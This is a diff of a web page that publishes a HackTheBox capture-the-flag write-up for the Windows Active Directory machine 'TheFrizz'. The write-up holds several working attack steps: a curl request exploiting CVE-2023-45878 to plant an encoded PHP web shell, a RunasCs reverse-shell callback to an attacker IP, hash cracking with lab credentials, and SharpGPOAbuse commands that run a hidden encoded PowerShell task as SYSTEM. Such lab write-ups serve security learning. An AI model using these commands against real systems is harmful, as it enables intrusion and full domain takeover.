@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>TheFrizz - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/TheFrizz.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for TheFrizz machine from HackTheBox - Medium difficulty level">
+    <meta name="description" content="Detailed writeup for TheFrizz machine from HackTheBox - Medium difficulty level">
     <meta name="keywords" content="HackTheBox, TheFrizz, Medium, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,111 @@
         <h1 class="writeup-title">TheFrizz</h1>
         <div class="writeup-metadata">
             <span class="difficulty medium">Medium</span>
-            <span class="date">Active machine</span>
+            <span class="date">August 23, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
                 <p><img alt="pwned" src="../images/TheFrizz/pwned.png" /></p>
-<p>TheFrizz is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once TheFrizz retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+<p>TheFrizz was a challenging Windows Active Directory box that began with an unauthenticated arbitrary file write vulnerability in a Gibbon LMS web application. Exploitation of CVE-2023-45878 was achieved using a crafted curl request to upload a PHP web shell, granting initial remote code execution on the Domain Controller.
+Post-exploitation enumeration revealed a config.php file containing database credentials, which were used to query the database and extract a salted SHA256 password hash for the user f.frizzle.
+The hash was successfully cracked using Hashcat, yielding plaintext credentials.</p>
+<p>With Kerberos authentication enforced on the network, I obtained a Ticket-Granting Ticket (TGT) for f.frizzle and gained interactive shell access via SSH.
+Manual enumeration revealed deleted archives in the Recycle Bin, which were downloaded using scp.
+One archive contained a configuration file with a Base64-encoded password. After enumerating domain users, the password was validated against the m.schoolbus account by successfully requesting a TGT.</p>
+<p>When direct SSH access for m.schoolbus failed due to a GSSAPI issue, I pivoted back to the initial web shell.
+I uploaded and executed the RunasCs.exe tool to obtain an interactive shell as the m.schoolbus user.
+Analysis of this user's privileges showed membership in the Group Policy Creator Owners group, presenting a clear path to domain dominance.
+I leveraged this privilege by creating a new Group Policy Object (GPO) and using SharpGPOAbuse to inject a malicious immediate scheduled task.
+After linking the GPO to the Domain Controllers OU and forcing a policy update with gpupdate /force, the task executed a Base64-encoded PowerShell reverse shell, granting a shell as NT AUTHORITY\SYSTEM and completing the privilege escalation chain.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/TheFrizz/nmap.png" /></p>
+<p>Nmap scan reveals quite a few ports. SSH on port 22 is a surprise, since this is a Windows machine.</p>
+<h2>Gibbon LMS RCE</h2>
+<p>I started my enumeration with the website located on port 80.</p>
+<p><img alt="website" src="../images/TheFrizz/website.png" /></p>
+<p>It seems to be an elementary school website. When hovering over the stall login button, an interesting link is revealed at the bottom left.</p>
+<p><img alt="gibbon" src="../images/TheFrizz/gibbon.png" /></p>
+<p>Gibbon LMS is an open-source school management platform. After clicking the button, I'm redirected to a login page, which also discloses the Gibbon version.</p>
+<p><img alt="login" src="../images/TheFrizz/login.png" /></p>
+<p>Searching for the applicable CVEs returned a few results, one of them being <code>CVE-2023-45878</code>, an arbitrary file write vulnerability.</p>
+<p><code>https://nvd.nist.gov/vuln/detail/CVE-2023-45878</code></p>
+<p><code>https://herolab.usd.de/security-advisories/usd-2023-0025/</code></p>
+<p>The second article shows and explains a way of exploiting this vulnerability. The endpoint accepts img, path, and gibbonPersonID as POST parameters. I'll craft a curl command that satisfies all 3, using the payload from the linked article.</p>
+<p>As explained in the article, the passed img data will be decoded and written to the location depicted in the path parameter.</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">curl</span><span class="w"> </span><span class="nt">-X</span><span class="w"> </span><span class="nt">POST</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">frizzdc</span><span class="p">.</span><span class="nc">frizz</span><span class="p">.</span><span class="nc">htb</span><span class="o">/</span><span class="nt">Gibbon-LMS</span><span class="o">/</span><span class="nt">modules</span><span class="o">/</span><span class="nt">Rubrics</span><span class="o">/</span><span class="nt">rubrics_visualise_saveAjax</span><span class="p">.</span><span class="nc">php</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="s2">&quot;Host: frizzdc.frizz.htb&quot;</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="s2">&quot;img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4K&quot;</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="s2">&quot;path=test1.php&quot;</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="s2">&quot;gibbonPersonID=0000000001&quot;</span>
+</code></pre></div>
+
+<p><img alt="rce" src="../images/TheFrizz/rce.png" />                                                                                                                                                                                                                             </p>
+<p>I can now successfully run commands on the DC.</p>
+<p>Next, I'd like to get a shell on the box. For that, I'll use a powershell reverse shell. However, because it'll be used as a part of the URL, it'll have to be URL-encoded to convert spaces and special characters safely.</p>
+<p>I started a listener in a different terminal and ran the curl command.</p>
+<p><img alt="shell" src="../images/TheFrizz/shell.png" /></p>
+<h2>Enumerating the Gibbon database</h2>
+<p><img alt="config" src="../images/TheFrizz/config.png" /></p>
+<p>It contains database details. Since XAMPP is installed, I can use mysql.exe to look into the Gibbon database. The executable is located under <code>C:\xampp\mysql\bin\mysql.exe</code></p>
+<p>Gibbon stores its user information under the <code>gibbonperson</code> table. I'll also add the -E flag for a clear view of the data.</p>
+<p><code>.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "use gibbon; select * from gibbonperson;" -E</code></p>
+<p><img alt="hash" src="../images/TheFrizz/hash.png" /></p>
+<p>I combined the password and the hash into one line so that I can crack it with hashcat.</p>
+<p><code>067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489</code></p>
+<p>Looking at the example hashes, the fitting modes would be 1410 and 1420, depending on whether the salt or the pass is first in the file.</p>
+<p><code>https://hashcat.net/wiki/doku.php?id=example_hashes</code></p>
+<p><code>hashcat -m 1420 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</code></p>
+<p><img alt="cracked" src="../images/TheFrizz/cracked.png" /></p>
+<p><code>f.frizzle | Jenni_Luvs_Magic23</code></p>
+<h2>Connecting to the machine via SSH</h2>
+<p>Remembering the note about kerberos being enforced, I used impacket-getTGT to get a ticket for f.frizzle.</p>
+<p><code>impacket-getTGT -dc-ip 10.10.11.60 frizz.htb/f.frizzle:Jenni_Luvs_Magic23</code></p>
+<p>With this ticket, I tried to remote into the machine with evil-winrm, but that failed.</p>
+<p>SSH was enabled on port 22, so I'll try that next.</p>
+<p><code>ssh f.frizzle@frizz.htb -k</code></p>
+<p>The -k switch here is for using kerberos auth.</p>
+<p><img alt="user" src="../images/TheFrizz/user.png" /></p>
+<h1>Root flag</h1>
+<p>Before using automated tools, I quickly looked through the DC manually as f.frizzle. I looked for DPAPI credentials, any custom scripts and other regular things to look out for.</p>
+<h2>Extracting the deleted archives</h2>
+<p>One of those would be the recycle bin, inside which there was a directory belonging to f.frizzle.</p>
+<p><img alt="dir" src="../images/TheFrizz/dir.png" /></p>
+<p>Both of these can be downloaded using scp.</p>
+<p><code>scp f.frizzle@frizz.htb:'C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' .</code></p>
+<p>I extracted both using 7z. Only the second archive was unzipped, because the one starting with IE was just plain data.</p>
+<p><img alt="wapt" src="../images/TheFrizz/wapt.png" /></p>
+<p>Inside the .ini file, I found a base64-encoded password.</p>
+<p><img alt="decode" src="../images/TheFrizz/decode.png" /></p>
+<p><code>? | !suBcig@MehTed!R</code></p>
+<h2>Finding a valid user with the new password</h2>
+<p>Since kerberos auth is enforced, I can't just do a password spray here. Instead, I will look at what users are on the domain first.</p>
+<p><img alt="users" src="../images/TheFrizz/users.png" /></p>
+<p>There are 2 high-value users. v.frizzle and m.schoolbus. Since there are only 2, I'll check the password against them manually by trying to request a TGT.</p>
+<p><code>impacket-getTGT -dc-ip 10.10.11.60 frizz.htb/m.schoolbus:'!suBcig@MehTed!R'</code></p>
+<p><img alt="schoolbus" src="../images/TheFrizz/schoolbus.png" /></p>
+<p><code>m.schoolbus | !suBcig@MehTed!R</code></p>
+<h2>Connecting to the box as m.schoolbus</h2>
+<p>While trying to SSH into the machine as m.schoolbus, I began getting unexpected errors related to GSSAPI auth.</p>
+<p><img alt="failauth" src="../images/TheFrizz/failauth.png" /></p>
+<p>Which I could not fix. Evil-winrm was not working either. Because of that, I returned to my first shell as the web user.</p>
+<p>From there, I downloaded RunasCs.exe from my box and executed it to get a shell as m.schoolbus.</p>
+<p><code>.\RunasCs.exe  m.schoolbus "!suBcig@MehTed!R"  powershell.exe -r 10.10.16.70:9002</code></p>
+<p><img alt="runas" src="../images/TheFrizz/runas.png" /></p>
+<h2>Getting a system shell via GPO abuse</h2>
+<p>M.schoolbus is in the <code>Group Policy Creator Owners</code>, which means that they can create Group Policy Objects and link them to objects.</p>
+<p>I can use SharpGPOAbuse from the sharp collection to make this easy.</p>
+<p><code>https://github.com/FSecureLABS/SharpGPOAbuse/blob/master/README.md</code></p>
+<p>Before that, I need to create a new GPO to abuse.</p>
+<p><code>New-GPO -Name malicious</code></p>
+<p>I'll link this GPO to the domain controllers OU.</p>
+<p><img alt="dc" src="../images/TheFrizz/dc.png" /></p>
+<p>Now, I'll take the .ps1 reverse shell from the 1st step. Its encoding needs to be changed from UTF-8 to UTF-16LE, because it'll be passed to powershell via the -e flag, which expects this encoding. Then, I'll encode the result with base-64, placing everything onto a single line.</p>
+<p><code>iconv -f UTF-8 -t UTF-16LE shell.ps1 | base64 -w 0</code></p>
+<p><img alt="rev" src="../images/TheFrizz/rev.png" /></p>
+<p>I'll run SharpGPOAbuse with the --AddComputerTask flag. This should give me system shell on the DC once the changes are applied.</p>
+<p><code>.\sharpgpo.exe --AddComputerTask --TaskName "Updates" --Author "NT AUTHORITY\SYSTEM" --Command "C:\Windows\System32\cmd.exe" --Arguments "/c powershell.exe -nol -nop -w hidden -e &lt;BASE64&gt;" " --GPOName malicious --Force</code></p>
+<p><img alt="sharpgpo" src="../images/TheFrizz/sharpgpo.png" /></p>
+<p>The changes can then be applied immediately by using <code>gpupdate /force</code></p>
+<p><img alt="root" src="../images/TheFrizz/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
